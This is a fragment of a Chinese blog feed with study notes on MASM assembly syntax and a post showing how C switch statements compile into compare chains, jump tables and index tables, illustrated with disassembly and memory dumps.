<h2 id="条件测试语句"><a href="#条件测试语句" class="headerlink" title="条件测试语句"></a>条件测试语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">寄存器或变量    操作符    操作数</div><div class="line">(表达式1) 逻辑运算符 (表达式2) 逻辑运算符 (表达式3) ...</div><div class="line">;举例，左边表达式，右边是表达式为真的条件</div><div class="line">x==3        ;x等于3</div><div class="line">eax!=3      ;eax不等于3</div><div class="line">(y&gt;=3)&amp;&amp;ebx ;y大于等于3且ebx为非零值</div><div class="line">;表达式的左边只能是变量或寄存器，不能为常数；表达式两边不能同时为变量，但可以同时是寄存器</div></pre></td></tr></table></figure>
<p>标志位的状态指示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">CARRY?        表示Carry位是否置位</div><div class="line">OVERFLOW?     表示Overflow位是否置位</div><div class="line">PARITY?       表示Parity位是否置位</div><div class="line">SIGN?         表示Sign位是否置位</div><div class="line">ZERO?         表示Zero位是否置位</div></pre></td></tr></table></figure></p>
<h2 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.if eax &amp;&amp; (bx &gt;= dWX) || !(dWY != ecx)</div><div class="line">    mov    esi,1</div><div class="line">.elseif edx</div><div class="line">    mov    esi,2</div><div class="line">.elseif esi &amp; 1</div><div class="line">    mov    esi,3</div><div class="line">.elseif ZERO? &amp;&amp; CARRY?</div><div class="line">    mov    esi,4</div><div class="line">.endif</div></pre></td></tr></table></figure>
<h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">.while 条件测试表达式</div><div class="line">    指令</div><div class="line">    [.break [.if 退出条件]]</div><div class="line">    [.continue]</div><div class="line">.endw</div><div class="line">;或</div><div class="line">.repeat</div><div class="line">    指令</div><div class="line">    [.break [.if 退出条件]]</div><div class="line">    [.continue]</div><div class="line">    .until    条件测试表达式    (或 .untilcxz [条件测试表达式])</div></pre></td></tr></table></figure>
<h2 id="变量和函数的命名"><a href="#变量和函数的命名" class="headerlink" title="变量和函数的命名"></a>变量和函数的命名</h2><h3 id="匈牙利表示法"><a href="#匈牙利表示法" class="headerlink" title="匈牙利表示法"></a>匈牙利表示法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">类型前缀+变量说明（类型用小写字母，说明则用首字母大写的几个引文单词组成）</div></pre></td></tr></table></figure>
<p>汇编语言中常用的类型前缀</p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">b</td>
<td style="text-align:left">表示byte</td>
</tr>
<tr>
<td style="text-align:left">w</td>
<td style="text-align:left">表示word</td>
</tr>
<tr>
<td style="text-align:left">dw</td>
<td style="text-align:left">表示dword</td>
</tr>
<tr>
<td style="text-align:left">h</td>
<td style="text-align:left">表示句柄</td>
</tr>
<tr>
<td style="text-align:left">lp</td>
<td style="text-align:left">表示指针</td>
</tr>
<tr>
<td style="text-align:left">sz</td>
<td style="text-align:left">表示以0结尾的字符串</td>
</tr>
<tr>
<td style="text-align:left">lpsz</td>
<td style="text-align:left">表示指向0结尾的字符串的指针</td>
</tr>
<tr>
<td style="text-align:left">f</td>
<td style="text-align:left">表示浮点数</td>
</tr>
<tr>
<td style="text-align:left">st</td>
<td style="text-align:left">表示一个数据结构</td>
</tr>
</tbody>
</table>
<p>举例</p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">hWinMain</td>
<td style="text-align:left">主窗口的句柄</td>
</tr>
<tr>
<td style="text-align:left">dwTimeCount</td>
<td style="text-align:left">时间计数器，以双字定义</td>
</tr>
<tr>
<td style="text-align:left">szWelcome</td>
<td style="text-align:left">欢迎信息字符串，以0结尾</td>
</tr>
<tr>
<td style="text-align:left">lpBuffer</td>
<td style="text-align:left">指向缓存区的指针</td>
</tr>
<tr>
<td style="text-align:left">stWndClass</td>
<td style="text-align:left">WNDCLASS结构</td>
</tr>
</tbody>
</table>
<p><strong>本书的作者建议</strong></p>
<ul>
<li>全局变量的定义使用标准的匈牙利表示法，在参数的前面加下划线；在局部变量的前面加@符号，这样引用的时候就能随时注意到变量的作用域。</li>
<li>在内部子程序的名称前面加下划线，以便和系统API区别。</li>
</ul>
<p>举例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">_Calc    proc    _dwX,_dwY</div><div class="line">         local   @dwResult</div><div class="line"></div><div class="line">         finit</div><div class="line">         fild    _dwX</div><div class="line">         fld     st(0)</div><div class="line">         fmul                ;i * i</div><div class="line">         fild    _dwY</div><div class="line">         fld     st(0)</div><div class="line">         fmul                ;j * j</div><div class="line">         fadd                ;i * i + j * j</div><div class="line">         fsqrt               ;sqrt(i * i + j * j)</div><div class="line">         fistp   @dwResult   ;put result</div><div class="line">         mov     eax,@dwResult</div><div class="line">         ret</div><div class="line"></div><div class="line">_calc    endp</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;内存模式&quot;&gt;&lt;a href=&quot;#内存模式&quot; class=&quot;headerlink&quot; title=&quot;内存模式&quot;&gt;&lt;/a&gt;内存模式&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;.386&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.model flat,stdcall ;子程序调用模式，win32中只能用stdcall，因为win32api调用使用的这个&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;option casemap:none ;定义了程序中变量和子程序名是否对大小写敏感，win32api名称区分大小写，所以只需要记住这个定式&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://hacktech.cn/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="二进制" scheme="http://hacktech.cn/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>switch反汇编(C语言)</title>
    <link href="http://hacktech.cn/2017/09/07/switch%E5%8F%8D%E6%B1%87%E7%BC%96-C%E8%AF%AD%E8%A8%80.html"/>
    <id>http://hacktech.cn/2017/09/07/switch反汇编-C语言.html</id>
    <published>2017-09-06T16:25:09.000Z</published>
    <updated>2017-09-06T16:27:53.707Z</updated>
    
    <content type="html"><![CDATA[<p>在分支较多的时候，switch的效率比if高，在反汇编中我们即可看到效率高的原因<br><a id="more"></a></p>
<h2 id="0x01分支结构不超过3个"><a href="#0x01分支结构不超过3个" class="headerlink" title="0x01分支结构不超过3个"></a>0x01分支结构不超过3个</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</div><div class="line">	<span class="keyword">switch</span>(x)</div><div class="line">	&#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">5</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">7</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">5:        int x = 5;</div><div class="line">00401028   mov         dword ptr [ebp-4],5</div><div class="line">6:        switch(x)</div><div class="line">7:        &#123;</div><div class="line">0040102F   mov         eax,dword ptr [ebp-4]</div><div class="line">00401032   mov         dword ptr [ebp-8],eax         //x的值放入[ebp-8]</div><div class="line">00401035   cmp         dword ptr [ebp-8],5</div><div class="line">00401039   je          main+39h (00401049)           //x与5相等就跳转，下面6和7相同</div><div class="line">0040103B   cmp         dword ptr [ebp-8],6</div><div class="line">0040103F   je          main+4Ch (0040105c)</div><div class="line">00401041   cmp         dword ptr [ebp-8],7</div><div class="line">00401045   je          main+5Fh (0040106f)</div><div class="line">00401047   jmp         main+72h (00401082)</div><div class="line">8:        case 5:</div><div class="line">9:            printf(&quot;%d\n&quot;,x);</div><div class="line">00401049   mov         ecx,dword ptr [ebp-4]</div><div class="line">0040104C   push        ecx</div><div class="line">0040104D   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401052   call        printf (004010d0)</div><div class="line">00401057   add         esp,8</div><div class="line">10:           break;</div><div class="line">0040105A   jmp         main+83h (00401093)</div><div class="line">11:       case 6:</div><div class="line">12:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040105C   mov         edx,dword ptr [ebp-4]</div><div class="line">0040105F   push        edx</div><div class="line">00401060   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401065   call        printf (004010d0)</div><div class="line">0040106A   add         esp,8</div><div class="line">13:           break;</div><div class="line">0040106D   jmp         main+83h (00401093)</div><div class="line">14:       case 7:</div><div class="line">15:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040106F   mov         eax,dword ptr [ebp-4]</div><div class="line">00401072   push        eax</div><div class="line">00401073   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401078   call        printf (004010d0)</div><div class="line">0040107D   add         esp,8</div><div class="line">16:           break;</div><div class="line">00401080   jmp         main+83h (00401093)</div><div class="line">17:       default:</div><div class="line">18:           printf(&quot;%d\n&quot;,x);</div><div class="line">00401082   mov         ecx,dword ptr [ebp-4]</div><div class="line">00401085   push        ecx</div><div class="line">00401086   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040108B   call        printf (004010d0)</div><div class="line">00401090   add         esp,8</div><div class="line">19:           break;</div><div class="line">20:       &#125;</div></pre></td></tr></table></figure>
<h2 id="0x02分支数超过3且分支存在线性关系"><a href="#0x02分支数超过3且分支存在线性关系" class="headerlink" title="0x02分支数超过3且分支存在线性关系"></a>0x02分支数超过3且分支存在线性关系</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</div><div class="line">	<span class="keyword">switch</span>(x)</div><div class="line">	&#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">5</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">7</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">8</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">9</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">5:        int x = 5;</div><div class="line">0040D778   mov         dword ptr [ebp-4],5</div><div class="line">6:        switch(x)</div><div class="line">7:        &#123;</div><div class="line">0040D77F   mov         eax,dword ptr [ebp-4]</div><div class="line">0040D782   mov         dword ptr [ebp-8],eax</div><div class="line">0040D785   mov         ecx,dword ptr [ebp-8]</div><div class="line">0040D788   sub         ecx,5                              //x减去分支中的最小值5，方便构建跳转表</div><div class="line">0040D78B   mov         dword ptr [ebp-8],ecx</div><div class="line">0040D78E   cmp         dword ptr [ebp-8],4                </div><div class="line">0040D792   ja          $L537+13h (0040d7fd)               //x-5&gt;4跳转到default，即x&gt;9跳转</div><div class="line">0040D794   mov         edx,dword ptr [ebp-8]              //edx=x-5</div><div class="line">0040D797   jmp         dword ptr [edx*4+40D81Fh]          //构建跳转表，根据edx的值从对应地址取出值(各个分支的地址)，40D81F为跳转表起始地址</div><div class="line">8:        case 5:</div><div class="line">9:            printf(&quot;%d\n&quot;,x);</div><div class="line">0040D79E   mov         eax,dword ptr [ebp-4]</div><div class="line">0040D7A1   push        eax</div><div class="line">0040D7A2   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7A7   call        printf (004010d0)</div><div class="line">0040D7AC   add         esp,8</div><div class="line">10:           break;</div><div class="line">0040D7AF   jmp         $L537+24h (0040d80e)</div><div class="line">11:       case 6:</div><div class="line">12:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7B1   mov         ecx,dword ptr [ebp-4]</div><div class="line">0040D7B4   push        ecx</div><div class="line">0040D7B5   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7BA   call        printf (004010d0)</div><div class="line">0040D7BF   add         esp,8</div><div class="line">13:           break;</div><div class="line">0040D7C2   jmp         $L537+24h (0040d80e)</div><div class="line">14:       case 7:</div><div class="line">15:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7C4   mov         edx,dword ptr [ebp-4]</div><div class="line">0040D7C7   push        edx</div><div class="line">0040D7C8   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7CD   call        printf (004010d0)</div><div class="line">0040D7D2   add         esp,8</div><div class="line">16:           break;</div><div class="line">0040D7D5   jmp         $L537+24h (0040d80e)</div><div class="line">17:       case 8:</div><div class="line">18:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7D7   mov         eax,dword ptr [ebp-4]</div><div class="line">0040D7DA   push        eax</div><div class="line">0040D7DB   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7E0   call        printf (004010d0)</div><div class="line">0040D7E5   add         esp,8</div><div class="line">19:           break;</div><div class="line">0040D7E8   jmp         $L537+24h (0040d80e)</div><div class="line">20:       case 9:</div><div class="line">21:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7EA   mov         ecx,dword ptr [ebp-4]</div><div class="line">0040D7ED   push        ecx</div><div class="line">0040D7EE   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7F3   call        printf (004010d0)</div><div class="line">0040D7F8   add         esp,8</div><div class="line">22:           break;</div><div class="line">0040D7FB   jmp         $L537+24h (0040d80e)</div><div class="line">23:       default:</div><div class="line">24:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7FD   mov         edx,dword ptr [ebp-4]</div><div class="line">0040D800   push        edx</div><div class="line">0040D801   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D806   call        printf (004010d0)</div><div class="line">0040D80B   add         esp,8</div><div class="line">25:           break;</div><div class="line">26:       &#125;</div></pre></td></tr></table></figure>
<p>跳转表从[edx*4+40D81Fh]取出分支的地址值然后进行jmp，下表是跳转表部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0040D81F  9E D7 40 00  ..@.</div><div class="line">0040D823  B1 D7 40 00  ..@.</div><div class="line">0040D827  C4 D7 40 00  ..@.</div><div class="line">0040D82B  D7 D7 40 00  ..@.</div><div class="line">0040D82F  EA D7 40 00  ..@.</div></pre></td></tr></table></figure></p>
<h2 id="0x03分支跃度大难以构成跳转表的分支结构"><a href="#0x03分支跃度大难以构成跳转表的分支结构" class="headerlink" title="0x03分支跃度大难以构成跳转表的分支结构"></a>0x03分支跃度大难以构成跳转表的分支结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</div><div class="line">	<span class="keyword">switch</span>(x)</div><div class="line">	&#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">5</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">7</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">8</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">100</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line">5:        int x = 5;</div><div class="line">00401028   mov         dword ptr [ebp-4],5</div><div class="line">6:        switch(x)</div><div class="line">7:        &#123;</div><div class="line">0040102F   mov         eax,dword ptr [ebp-4]</div><div class="line">00401032   mov         dword ptr [ebp-8],eax</div><div class="line">00401035   mov         ecx,dword ptr [ebp-8]</div><div class="line">00401038   sub         ecx,5</div><div class="line">0040103B   mov         dword ptr [ebp-8],ecx</div><div class="line">0040103E   cmp         dword ptr [ebp-8],5Fh</div><div class="line">00401042   ja          $L536+13h (004010b5)               //具体参见上一种,x大于100跳转到default</div><div class="line">00401044   mov         eax,dword ptr [ebp-8]              //edx=x-5</div><div class="line">00401047   xor         edx,edx                            //edx置零</div><div class="line">00401049   mov         dl,byte ptr  (004010ef)[eax]       //查询索引表并将取出来的值放入DL(在od里面的这条反汇编更清楚)</div><div class="line">0040104F   jmp         dword ptr [edx*4+4010D7h]          //根据DL(EDX)的值查跳转表</div><div class="line">8:        case 5:</div><div class="line">9:            printf(&quot;%d\n&quot;,x);</div><div class="line">00401056   mov         ecx,dword ptr [ebp-4]</div><div class="line">00401059   push        ecx</div><div class="line">0040105A   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040105F   call        printf (004011a0)</div><div class="line">00401064   add         esp,8</div><div class="line">10:           break;</div><div class="line">00401067   jmp         $L536+24h (004010c6)</div><div class="line">11:       case 6:</div><div class="line">12:           printf(&quot;%d\n&quot;,x);</div><div class="line">00401069   mov         edx,dword ptr [ebp-4]</div><div class="line">0040106C   push        edx</div><div class="line">0040106D   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401072   call        printf (004011a0)</div><div class="line">00401077   add         esp,8</div><div class="line">13:           break;</div><div class="line">0040107A   jmp         $L536+24h (004010c6)</div><div class="line">14:       case 7:</div><div class="line">15:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040107C   mov         eax,dword ptr [ebp-4]</div><div class="line">0040107F   push        eax</div><div class="line">00401080   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401085   call        printf (004011a0)</div><div class="line">0040108A   add         esp,8</div><div class="line">16:           break;</div><div class="line">0040108D   jmp         $L536+24h (004010c6)</div><div class="line">17:       case 8:</div><div class="line">18:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040108F   mov         ecx,dword ptr [ebp-4]</div><div class="line">00401092   push        ecx</div><div class="line">00401093   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401098   call        printf (004011a0)</div><div class="line">0040109D   add         esp,8</div><div class="line">19:           break;</div><div class="line">004010A0   jmp         $L536+24h (004010c6)</div><div class="line">20:       case 100:</div><div class="line">21:           printf(&quot;%d\n&quot;,x);</div><div class="line">004010A2   mov         edx,dword ptr [ebp-4]</div><div class="line">004010A5   push        edx</div><div class="line">004010A6   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">004010AB   call        printf (004011a0)</div><div class="line">004010B0   add         esp,8</div><div class="line">22:           break;</div><div class="line">004010B3   jmp         $L536+24h (004010c6)</div><div class="line">23:       default:</div><div class="line">24:           printf(&quot;%d\n&quot;,x);</div><div class="line">004010B5   mov         eax,dword ptr [ebp-4]</div><div class="line">004010B8   push        eax</div><div class="line">004010B9   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">004010BE   call        printf (004011a0)</div><div class="line">004010C3   add         esp,8</div><div class="line">25:           break;</div><div class="line">26:       &#125;</div></pre></td></tr></table></figure>
<p>索引表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">004010F1  00 01 02 03 05 05 05 05  ........</div><div class="line">004010F9  05 05 05 05 05 05 05 05  ........</div><div class="line">00401101  05 05 05 05 05 05 05 05  ........</div><div class="line">00401109  05 05 05 05 05 05 05 05  ........</div><div class="line">00401111  05 05 05 05 05 05 05 05  ........</div><div class="line">00401119  05 05 05 05 05 05 05 05  ........</div><div class="line">00401121  05 05 05 05 05 05 05 05  ........</div><div class="line">00401129  05 05 05 05 05 05 05 05  ........</div><div class="line">00401131  05 05 05 05 05 05 05 05  ........</div><div class="line">00401139  05 05 05 05 05 05 05 05  ........</div><div class="line">00401141  05 05 05 05 05 05 05 05  ........</div><div class="line">00401149  05 05 05 05 05 05 05 04  ........</div></pre></td></tr></table></figure></p>
